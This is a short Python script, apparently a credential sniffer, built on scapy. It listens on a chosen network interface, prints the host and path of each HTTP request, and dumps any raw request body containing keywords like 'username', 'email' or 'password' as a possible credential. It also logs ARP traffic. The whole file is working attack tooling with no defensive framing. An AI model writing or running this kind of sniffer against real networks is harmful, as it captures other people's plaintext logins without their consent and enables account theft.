import scapy.all as scapy
from scapy.layers import http
import argparse


def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-i",
        "--interface",
        dest="interface",
        help="Specify the interface to sniff packets on"
    )
    arguments = parser.parse_args()
    return arguments.interface


def snnif(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):

        host = packet[http.HTTPRequest].Host
        path = packet[http.HTTPRequest].Path

        if isinstance(host, bytes):
            host = host.decode(errors="replace")

        if isinstance(path, bytes):
            path = path.decode(errors="replace")

        print("[+] HTTP Request >> " + host + path)

        if packet.haslayer(scapy.Raw):
            keys = ["username", "user", "email", "password", "pass"]

            load = packet[scapy.Raw].load

            if isinstance(load, bytes):
                load = load.decode(errors="replace")

            for key in keys:
                if key in load:
                    print(f"[+] Possible password/username >> {load}")
                    break

        print(f"HTTP Request: {host} -> {path}")

    elif packet.haslayer(scapy.ARP):
        print(
            f"ARP Packet: "
            f"{packet[scapy.ARP].psrc} -> "
            f"{packet[scapy.ARP].pdst}"
        )


iface = get_interface()
snnif(iface)